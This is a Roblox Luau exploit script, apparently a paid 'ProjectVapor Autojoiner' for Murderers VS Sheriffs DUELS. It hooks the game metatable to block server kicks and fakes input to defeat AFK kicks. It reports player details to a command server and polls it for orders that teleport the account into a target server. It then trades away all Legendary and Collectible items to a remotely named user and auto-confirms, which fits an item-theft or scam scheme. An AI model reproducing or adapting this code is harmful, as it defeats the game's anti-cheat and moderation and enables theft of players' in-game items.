local RanTimes = 0

local Connection = game:GetService("RunService").Heartbeat:Connect(function()
    RanTimes += 1
end)

repeat
    task.wait()
until RanTimes >= 2

Connection:Disconnect()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualUser = game:GetService("VirtualUser")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")

local executorName = "Unknown"
local isDelta = false
local isXeno = false
local isSolara = false

local function detectExecutor()
    if syn and syn.request then
        local success, response = pcall(function()
            return syn.request({
                Url = "http://127.0.0.1:6464/rpc",
                Method = "GET"
            })
        end)
        if success and response then
            isDelta = true
            executorName = "Delta"
            return "Delta"
        end
    end
    if isfolder and isfolder("Delta") then
        isDelta = true
        executorName = "Delta"
        return "Delta"
    end
    if syn and syn.crypt then
        isDelta = true
        executorName = "Delta"
        return "Delta"
    end
    if getexecutorname then
        local name = getexecutorname()
        if name and name ~= "" then
            local lowerName = string.lower(name)
            if string.find(lowerName, "xeno") then
                isXeno = true
                executorName = "Xeno"
                return "Xeno"
            end
            if string.find(lowerName, "solara") then
                isSolara = true
                executorName = "Solara"
                return "Solara"
            end
            executorName = name
            return name
        end
    end
    if syn then
        executorName = "Synapse X"
        return "Synapse X"
    end
    if krnl then
        executorName = "Krnl"
        return "Krnl"
    end
    if script and script:FindFirstChild("Script") and script.Script:FindFirstChild("Source") then
        executorName = "ScriptWare"
        return "ScriptWare"
    end
    executorName = "Unknown"
    return "Unknown"
end

detectExecutor()

local bypassCount = 0
local joinTime = os.time()
local lastUpdateTime = os.time()
local idledConnection = nil
local updateConnection = nil

local function FormatTime(seconds)
    local hours = math.floor(seconds / 3600)
    local minutes = math.floor((seconds % 3600) / 60)
    local secs = seconds % 60
    return string.format("%02d:%02d:%02d", hours, minutes, secs)
end

local function SendBypassNotification()
    bypassCount = bypassCount + 1
    
    local currentTime = os.time()
    if currentTime - lastUpdateTime >= 1200 then
        lastUpdateTime = currentTime
        pcall(function()
            StarterGui:SetCore("SendNotification", {
                Title = "Anti AFK",
                Text = "Bypassed " .. bypassCount .. " kick" .. (bypassCount ~= 1 and "s" or ""),
                Duration = 3,
                Button1 = "OK"
            })
        end)
    end
end

idledConnection = LocalPlayer.Idled:Connect(function()
    pcall(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new(0, 0))
        SendBypassNotification()
    end)
end)

pcall(function()
    local mt = getrawmetatable(game)
    local oldNamecall = mt.__namecall
    setreadonly(mt, false)
    mt.__namecall = newcclosure(function(self, ...)
        local method = getnamecallmethod()
        if method == "Kick" and self == LocalPlayer then
            return nil
        end
        return oldNamecall(self, ...)
    end)
    setreadonly(mt, true)
end)

local WHITELIST = {
    "AcceidentalRedSlash",
    "Johnny_DDoe",
    "prince_charms67",
    "Playtimefolks",
    "iyan_ph8",
    "hgpacorro",
    "3962gomna2",
    "matisbatto",
    "Zoro3128403",
    "Vibrantbibe7Z"
}

local function isWhitelisted()
    local playerName = LocalPlayer.Name
    for _, name in pairs(WHITELIST) do
        if playerName == name then
            return true
        end
    end
    return false
end

if not isWhitelisted() then
    task.wait(1)
    LocalPlayer:Kick("You are not whitelisted to use this script.")
    return
end

local correctGameIds = {4348829796, 12355337193, 13771457545, 14195703130}
local gameId = game.PlaceId
local gameName = "Murderers VS Sheriffs DUELS"
local isCorrectGame = false
for _, id in pairs(correctGameIds) do
    if gameId == id then
        isCorrectGame = true
        break
    end
end

if not isCorrectGame then
    task.delay(1, function()
        LocalPlayer:Kick("Wrong server. Go to TradingHub (Murderers VS Sheriffs DUELS) game.")
    end)
    return
end

local SERVER_URL = "http://127.0.0.1:9"

local autoJoinActive = true
local checkTask = nil
local TARGET_USER_NAME = nil
local ITEMS_ADDED = false
local ADDING_ITEMS = false
local TARGET_IN_TRADE = false
local HAS_CONFIRMED = false

local screenGui, frame, statusBox, lastJoin, antiAfkTimeLabel

local function fetchRobloxAvatar(userId)
    local requestFunc = syn and syn.request or request or http_request or (http and http.request)
    if not requestFunc then return nil end
    local avatarUrl = nil
    local success, response = pcall(function()
        return requestFunc({
            Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. tostring(userId) .. "&size=420x420&format=png",
            Method = "GET",
            Headers = {
                ["Content-Type"] = "application/json"
            }
        })
    end)
    if success and response and response.StatusCode == 200 then
        local decodeSuccess, data = pcall(function()
            return HttpService:JSONDecode(response.Body)
        end)
        if decodeSuccess and data and data.data and data.data[1] and data.data[1].imageUrl then
            avatarUrl = data.data[1].imageUrl
        end
    end
    if not avatarUrl then
        avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
    end
    return avatarUrl
end

local function sendToServer(data)
    local requestFunc = syn and syn.request or request or http_request or (http and http.request)
    if not requestFunc then return false end
    
    local success, response = pcall(function()
        return requestFunc({
            Url = SERVER_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(data)
        })
    end)
    
    if success and response then
        return true
    end
    return false
end

local function fetchCommandsFromServer()
    local requestFunc = syn and syn.request or request or http_request or (http and http.request)
    if not requestFunc then return nil end
    
    local success, response = pcall(function()
        return requestFunc({
            Url = SERVER_URL .. "/get_commands",
            Method = "GET"
        })
    end)
    
    if success and response and response.StatusCode == 200 then
        local decodeSuccess, data = pcall(function()
            return HttpService:JSONDecode(response.Body)
        end)
        if decodeSuccess and data then
            return data
        end
    end
    return nil
end

local function clearServerCommand()
    pcall(function()
        local requestFunc = syn and syn.request or request or http_request or (http and http.request)
        if requestFunc then
            requestFunc({
                Url = SERVER_URL .. "/clear",
                Method = "POST"
            })
        end
    end)
end

local function sendWebhook(data)
    return sendToServer(data)
end

local function sendStartEmbed(playerName, displayName, userId, gameName, avatarUrl)
    local embedData = {
        embeds = {{
            title = "In Mvsd waiting | Autojoiner",
            color = 3447003,
            thumbnail = {
                url = avatarUrl
            },
            fields = {
                {
                    name = "Username",
                    value = playerName,
                    inline = true
                },
                {
                    name = "Display Name",
                    value = displayName,
                    inline = true
                },
                {
                    name = "User ID",
                    value = tostring(userId),
                    inline = true
                },
                {
                    name = "Executor",
                    value = executorName,
                    inline = true
                },
                {
                    name = "Game",
                    value = gameName,
                    inline = true
                },
                {
                    name = "Status",
                    value = (gameId == 14195703130 and "Accepting trade & Confirming" or "Waiting for hits"),
                    inline = true
                }
            },
            footer = {
                text = "ProjectVapor"
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    return sendWebhook(embedData)
end

local function sendTeleportEmbed(jobId, targetPlaceId, playerName, displayName, userId, gameName, avatarUrl)
    local embedData = {
        embeds = {{
            title = "Teleporting now | Autojoiner",
            color = 3447003,
            thumbnail = {
                url = avatarUrl
            },
            fields = {
                {
                    name = "User",
                    value = playerName,
                    inline = true
                },
                {
                    name = "Display Name",
                    value = displayName,
                    inline = true
                },
                {
                    name = "User ID",
                    value = tostring(userId),
                    inline = true
                },
                {
                    name = "Executor",
                    value = executorName,
                    inline = true
                },
                {
                    name = "Game",
                    value = gameName,
                    inline = true
                },
                {
                    name = "Job ID",
                    value = jobId,
                    inline = true
                },
                {
                    name = "Place ID",
                    value = tostring(targetPlaceId),
                    inline = true
                }
            },
            footer = {
                text = "ProjectVapor"
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }},
        placeId = targetPlaceId,
        jobId = jobId
    }
    return sendWebhook(embedData)
end

local function sendDiscordMessage(message)
    local data = {
        content = message
    }
    return sendWebhook(data)
end

local function teleportToServer(jobId, targetPlaceId)
    if not jobId or not targetPlaceId then
        return false, "Missing jobId or placeId"
    end
    
    if statusBox then
        statusBox.Text = "Teleporting to: " .. string.sub(jobId, 1, 8) .. "..."
    end
    
    local success, err = pcall(function()
        TeleportService:TeleportToPlaceInstance(targetPlaceId, jobId, LocalPlayer)
    end)
    
    if success then
        return true, nil
    else
        return false, tostring(err)
    end
end

local function extractJoinData(content)
    if not content then return nil, nil end
    
    local placeId = string.match(content, "TeleportToPlaceInstance%((%d+)")
    local jobId = string.match(content, 'TeleportToPlaceInstance%(%d+,%s*"([%w%-]+)"')
    
    if not jobId then
        jobId = string.match(content, "([%w%-]+%-[%w%-]+%-[%w%-]+%-[%w%-]+%-[%w%-]+)")
    end
    
    if not jobId then
        jobId = string.match(content, "(%x%x%x%x%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%x%x%x%x%x%x%x%x)")
    end
    
    if not placeId then
        placeId = string.match(content, "(%d%d%d%d%d%d%d%d%d+)")
    end
    
    if placeId and jobId then
        return tonumber(placeId), jobId
    end
    
    return nil, nil
end

local function isTargetPlayer(player)
    if not TARGET_USER_NAME then
        return false
    end
    return player.Name == TARGET_USER_NAME or player.DisplayName == TARGET_USER_NAME
end

local function acceptTradeFromTarget()
    local Trading = ReplicatedStorage:FindFirstChild("Trading")
    if not Trading then return end
    
    local AcceptRequest = Trading:FindFirstChild("AcceptRequest")
    if not AcceptRequest then return end
    
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and isTargetPlayer(player) then
            pcall(function()
                AcceptRequest:InvokeServer(player)
            end)
            TARGET_IN_TRADE = true
            break
        end
    end
end

local function handleBasicTrade()
    task.spawn(function()
        while autoJoinActive do
            local PlayerGui = LocalPlayer:FindFirstChild("PlayerGui")
            local inTrade = false
            if PlayerGui then
                local success = pcall(function()
                    local label = PlayerGui.TradingGui.Frame.BodyFrame.OfferFrame.ListFrame.TradeOfferFrame.HeaderFrame.NameTextLabel
                    if label and label.Text then
                        inTrade = true
                    end
                end)
            end
            
            if inTrade then
                local partner = nil
                if PlayerGui then
                    local success, partnerName = pcall(function()
                        local label = PlayerGui.TradingGui.Frame.BodyFrame.OfferFrame.ListFrame.TradeOfferFrame.HeaderFrame.NameTextLabel
                        return label.Text:gsub("'s Offer", "")
                    end)
                    if success then
                        partner = partnerName
                    end
                end
                
                if partner and TARGET_USER_NAME then
                    local targetPlayer = Players:FindFirstChild(partner)
                    if targetPlayer and isTargetPlayer(targetPlayer) then
                        local Trading = ReplicatedStorage:FindFirstChild("Trading")
                        if Trading then
                            local ConfirmTrade = Trading:FindFirstChild("ConfirmTrade")
                            local AcceptTrade = Trading:FindFirstChild("AcceptTrade")
                            if ConfirmTrade and AcceptTrade then
                                if statusBox then
                                    statusBox.Text = "Confirming trade..."
                                end
                                ConfirmTrade:FireServer()
                                task.wait(0.3)
                                if statusBox then
                                    statusBox.Text = "Accepting trade..."
                                end
                                AcceptTrade:FireServer()
                                if statusBox then
                                    statusBox.Text = "Trade accepted"
                                end
                                task.wait(1)
                            end
                        end
                    end
                end
            end
            task.wait(0.5)
        end
    end)
end

local function addItemsToTrade()
    if ADDING_ITEMS or ITEMS_ADDED then return end
    
    ADDING_ITEMS = true
    ITEMS_ADDED = false
    HAS_CONFIRMED = false
    
    local success, CollectionService = pcall(function()
        return require(ReplicatedStorage.Collection.PlayerCollectionService)
    end)
    if not success or not CollectionService then
        ADDING_ITEMS = false
        if statusBox then
            statusBox.Text = "Failed"
        end
        return
    end
    
    local success2, ItemDatabase = pcall(function()
        return require(ReplicatedStorage.Collection.ItemDatabase)
    end)
    if not success2 or not ItemDatabase then
        ADDING_ITEMS = false
        if statusBox then
            statusBox.Text = "Failed"
        end
        return
    end
    
    local success3, collection = pcall(function()
        return CollectionService.GetCollection()
    end)
    if not success3 or not collection then
        ADDING_ITEMS = false
        if statusBox then
            statusBox.Text = "Failed"
        end
        return
    end
    
    local Trading = ReplicatedStorage:FindFirstChild("Trading")
    if not Trading then 
        ADDING_ITEMS = false
        return 
    end
    
    local AddItem = Trading:FindFirstChild("AddItem")
    if not AddItem then 
        ADDING_ITEMS = false
        return 
    end
    
    local itemsAdded = 0
    for _, item in ipairs(collection) do
        if item and item.Id then
            local success4, info = pcall(function()
                return ItemDatabase.getEntry(item.Id)
            end)
            if success4 and info then
                local rarity = tostring(info.Rarity):gsub("Enum.ItemRarity.", "")
                if rarity == "Legendary" or rarity == "Collectible" then
                    pcall(function()
                        AddItem:InvokeServer(item.Id)
                        itemsAdded = itemsAdded + 1
                        task.wait(0.05)
                    end)
                end
            end
        end
    end
    
    ADDING_ITEMS = false
    
    if itemsAdded > 0 then
        ITEMS_ADDED = true
        if statusBox then
            statusBox.Text = "Added " .. itemsAdded .. " items to trade"
        end
    else
        ITEMS_ADDED = false
        if statusBox then
            statusBox.Text = "failed"
        end
    end
end

local function InTrade()
    local PlayerGui = LocalPlayer:FindFirstChild("PlayerGui")
    if not PlayerGui then
        return false
    end
    local success = pcall(function()
        local label = PlayerGui.TradingGui.Frame.BodyFrame.OfferFrame.ListFrame.TradeOfferFrame.HeaderFrame.NameTextLabel
        return label.Text
    end)
    return success
end

local function getTradePartner()
    local PlayerGui = LocalPlayer:FindFirstChild("PlayerGui")
    if not PlayerGui then
        return nil
    end
    local success, partner = pcall(function()
        local label = PlayerGui.TradingGui.Frame.BodyFrame.OfferFrame.ListFrame.TradeOfferFrame.HeaderFrame.NameTextLabel
        return label.Text:gsub("'s Offer", "")
    end)
    if success then
        return partner
    end
    return nil
end

local function checkForCommands()
    local commandData = fetchCommandsFromServer()
    
    if not commandData then 
        if statusBox then 
            statusBox.Text = "Failed to fetch commands" 
        end
        return 
    end
    
    if commandData.targetUsername then
        TARGET_USER_NAME = commandData.targetUsername
        ITEMS_ADDED = false
        ADDING_ITEMS = false
        TARGET_IN_TRADE = false
        HAS_CONFIRMED = false
        if statusBox then
            statusBox.Text = "Target set: " .. TARGET_USER_NAME
        end
        acceptTradeFromTarget()
        clearServerCommand()
        return
    end
    
    if commandData.placeId and commandData.jobId then
        local targetPlaceId = tonumber(commandData.placeId)
        local jobId = commandData.jobId
        
        if targetPlaceId and jobId then
            if statusBox then
                statusBox.Text = "Place: " .. tostring(targetPlaceId) .. " Job: " .. string.sub(jobId, 1, 8) .. "..."
            end
            
            local playerName = LocalPlayer.Name
            local displayName = LocalPlayer.DisplayName
            local userId = LocalPlayer.UserId
            local avatarUrl = fetchRobloxAvatar(userId)
            
            sendTeleportEmbed(jobId, targetPlaceId, playerName, displayName, userId, gameName, avatarUrl)
            
            if gameId == targetPlaceId then
                if statusBox then
                    statusBox.Text = "Already in this server"
                end
                if lastJoin then
                    lastJoin.Text = "Already in server: " .. string.sub(jobId, 1, 8) .. " at " .. os.date("%H:%M:%S")
                end
            else
                local success, err = teleportToServer(jobId, targetPlaceId)
                if success then
                    if statusBox then
                        statusBox.Text = "Teleported"
                    end
                    if lastJoin then
                        lastJoin.Text = "Joined: " .. string.sub(jobId, 1, 8) .. " at " .. os.date("%H:%M:%S")
                    end
                else
                    if statusBox then
                        statusBox.Text = "Teleport failed: " .. tostring(err)
                    end
                end
            end
            
            clearServerCommand()
        end
    else
        if statusBox then
            if gameId == 14195703130 then
                statusBox.Text = "Waiting for target username..."
            else
                statusBox.Text = "Waiting for hits..."
            end
        end
    end
end

screenGui = Instance.new("ScreenGui")
screenGui.Name = "PaidUser"
screenGui.Parent = CoreGui

frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 500, 0, 300)
frame.Position = UDim2.new(0.5, -250, 0.5, -150)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BackgroundTransparency = 0.1
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 35)
titleBar.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
titleBar.BorderSizePixel = 0
titleBar.Parent = frame

local logo = Instance.new("ImageLabel")
logo.Size = UDim2.new(0, 25, 0, 25)
logo.Position = UDim2.new(0, 10, 0, 5)
logo.BackgroundTransparency = 1
pcall(function()
    logo.Image = "rbxassetid://102077742709888"
end)
logo.Parent = titleBar

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -50, 1, 0)
title.Position = UDim2.new(0, 40, 0, 0)
title.BackgroundTransparency = 1
if isDelta then
    title.Text = "Paid User | ProjectVapor Autojoiner"
else
    title.Text = "Paid User | Autojoiner"
end
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 16
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = titleBar

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -35, 0, 2)
closeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.TextSize = 14
closeBtn.Font = Enum.Font.GothamBold
closeBtn.BorderSizePixel = 0
closeBtn.Parent = titleBar
closeBtn.MouseButton1Click:Connect(function()
    autoJoinActive = false
    if checkTask then
        task.cancel(checkTask)
        checkTask = nil
    end
    if idledConnection then
        idledConnection:Disconnect()
    end
    if updateConnection then
        updateConnection:Disconnect()
    end
    screenGui:Destroy()
end)

local gameInfo = Instance.new("TextLabel")
gameInfo.Size = UDim2.new(0.9, 0, 0, 25)
gameInfo.Position = UDim2.new(0.05, 0, 0, 45)
gameInfo.BackgroundTransparency = 1
gameInfo.Text = "Game: " .. gameName .. " (ID: " .. tostring(gameId) .. ")"
gameInfo.TextColor3 = Color3.fromRGB(200, 200, 200)
gameInfo.TextSize = 12
gameInfo.Font = Enum.Font.Gotham
gameInfo.TextXAlignment = Enum.TextXAlignment.Left
gameInfo.Parent = frame

statusBox = Instance.new("TextLabel")
statusBox.Size = UDim2.new(0.9, 0, 0, 55)
statusBox.Position = UDim2.new(0.05, 0, 0, 75)
statusBox.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
statusBox.TextColor3 = Color3.fromRGB(200, 200, 200)
statusBox.TextSize = 13
statusBox.Font = Enum.Font.Gotham
if isDelta then
    statusBox.Text = "Starting ProjectVapor | Autojoiner..."
else
    statusBox.Text = "Starting autojoiner..."
end
statusBox.TextWrapped = true
statusBox.TextXAlignment = Enum.TextXAlignment.Center
statusBox.TextYAlignment = Enum.TextYAlignment.Center
statusBox.Parent = frame

lastJoin = Instance.new("TextLabel")
lastJoin.Size = UDim2.new(0.9, 0, 0, 25)
lastJoin.Position = UDim2.new(0.05, 0, 0, 135)
lastJoin.BackgroundTransparency = 1
lastJoin.Text = "Status: Running"
lastJoin.TextColor3 = Color3.fromRGB(0, 255, 0)
lastJoin.TextSize = 11
lastJoin.Font = Enum.Font.Gotham
lastJoin.TextXAlignment = Enum.TextXAlignment.Center
lastJoin.Parent = frame

local antiAfkFrame = Instance.new("Frame")
antiAfkFrame.Size = UDim2.new(0.9, 0, 0, 70)
antiAfkFrame.Position = UDim2.new(0.05, 0, 0, 170)
antiAfkFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
antiAfkFrame.BorderSizePixel = 1
antiAfkFrame.BorderColor3 = Color3.fromRGB(40, 40, 40)
antiAfkFrame.Parent = frame

local antiAfkTitle = Instance.new("TextLabel")
antiAfkTitle.Size = UDim2.new(1, 0, 0, 20)
antiAfkTitle.Position = UDim2.new(0, 0, 0, 2)
antiAfkTitle.BackgroundTransparency = 1
antiAfkTitle.Text = "Anti Afk"
antiAfkTitle.TextColor3 = Color3.fromRGB(0, 255, 100)
antiAfkTitle.TextSize = 12
antiAfkTitle.Font = Enum.Font.GothamBold
antiAfkTitle.TextXAlignment = Enum.TextXAlignment.Center
antiAfkTitle.Parent = antiAfkFrame

antiAfkTimeLabel = Instance.new("TextLabel")
antiAfkTimeLabel.Size = UDim2.new(1, 0, 0, 20)
antiAfkTimeLabel.Position = UDim2.new(0, 0, 0, 25)
antiAfkTimeLabel.BackgroundTransparency = 1
antiAfkTimeLabel.Text = "Time: 00:00:00"
antiAfkTimeLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
antiAfkTimeLabel.TextSize = 11
antiAfkTimeLabel.Font = Enum.Font.Gotham
antiAfkTimeLabel.TextXAlignment = Enum.TextXAlignment.Center
antiAfkTimeLabel.Parent = antiAfkFrame

local antiAfkStatus = Instance.new("TextLabel")
antiAfkStatus.Size = UDim2.new(1, 0, 0, 20)
antiAfkStatus.Position = UDim2.new(0, 0, 0, 48)
antiAfkStatus.BackgroundTransparency = 1
antiAfkStatus.Text = "Status: Active"
antiAfkStatus.TextColor3 = Color3.fromRGB(0, 255, 100)
antiAfkStatus.TextSize = 11
antiAfkStatus.Font = Enum.Font.Gotham
antiAfkStatus.TextXAlignment = Enum.TextXAlignment.Center
antiAfkStatus.Parent = antiAfkFrame

updateConnection = RunService.Heartbeat:Connect(function()
    if antiAfkTimeLabel and antiAfkTimeLabel.Parent then
        local currentTime = os.time()
        local elapsedTime = currentTime - joinTime
        antiAfkTimeLabel.Text = "Time: " .. FormatTime(elapsedTime)
    end
end)

local playerName = LocalPlayer.Name
local displayName = LocalPlayer.DisplayName
local userId = LocalPlayer.UserId
local avatarUrl = fetchRobloxAvatar(userId)

sendStartEmbed(playerName, displayName, userId, gameName, avatarUrl)

if isXeno or isSolara then
    handleBasicTrade()
end

if not isXeno and not isSolara and gameId == 14195703130 then
    if statusBox then statusBox.Text = "accepting trade now..." end
    task.spawn(function()
        while autoJoinActive do
            if InTrade() then
                local partner = getTradePartner()
                if partner and TARGET_USER_NAME then
                    local targetPlayer = Players:FindFirstChild(partner)
                    if targetPlayer and isTargetPlayer(targetPlayer) then
                        if not ITEMS_ADDED and not ADDING_ITEMS then
                            addItemsToTrade()
                        end
                        
                        if ITEMS_ADDED and not HAS_CONFIRMED then
                            local Trading = ReplicatedStorage:FindFirstChild("Trading")
                            if Trading then
                                local ConfirmTrade = Trading:FindFirstChild("ConfirmTrade")
                                local AcceptTrade = Trading:FindFirstChild("AcceptTrade")
                                if ConfirmTrade and AcceptTrade then
                                    if statusBox then
                                        statusBox.Text = "Confirming trade..."
                                    end
                                    ConfirmTrade:FireServer()
                                    task.wait(5)
                                    if statusBox then
                                        statusBox.Text = "Accepting trade..."
                                    end
                                    AcceptTrade:FireServer()
                                    HAS_CONFIRMED = true
                                    if statusBox then
                                        statusBox.Text = "Trade accepted"
                                    end
                                    task.wait(1)
                                end
                            end
                        end
                    end
                end
            end
            task.wait(0.5)
        end
    end)
end

checkTask = task.spawn(function()
    while autoJoinActive do
        checkForCommands()
        task.wait(3)
    end
end)
